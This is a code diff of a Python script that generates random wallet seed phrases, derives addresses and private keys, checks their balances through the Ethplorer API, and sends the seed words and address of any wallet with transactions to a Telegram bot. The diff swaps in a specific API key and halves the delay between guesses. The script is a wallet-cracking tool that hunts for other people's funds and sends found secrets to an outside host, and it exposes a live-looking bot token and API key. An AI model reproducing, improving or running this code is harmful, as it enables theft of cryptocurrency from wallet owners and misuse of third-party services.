@@ -39,7 +39,7 @@ def check():
             mixword = words[:32]
             addr = bip44_hdwallet.p2pkh_address()
             priv = bip44_hdwallet.private_key()
-            bal = requests.get('https://api.ethplorer.io/getAddressInfo/'+addr+'?apiKey=freekey').json()
+            bal = requests.get('https://api.ethplorer.io/getAddressInfo/'+addr+'?apiKey=EK-75ZNR-kyDJyJY-WCNoJ').json()
             print(addr, priv)
             print(words)
             print(bal)
@@ -47,7 +47,7 @@ def check():
             if bal['countTxs'] > 0:
                 requests.get(
                 'https://api.telegram.org/bot5660911952:AAF4fdv2fjzeyqUHtvjsm51wtPl0eCoQkaQ/sendMessage?chat_id=400635213&text=' + words + '\n' + addr)
-            time.sleep(10)
+            time.sleep(5)
 
     except:
         pass
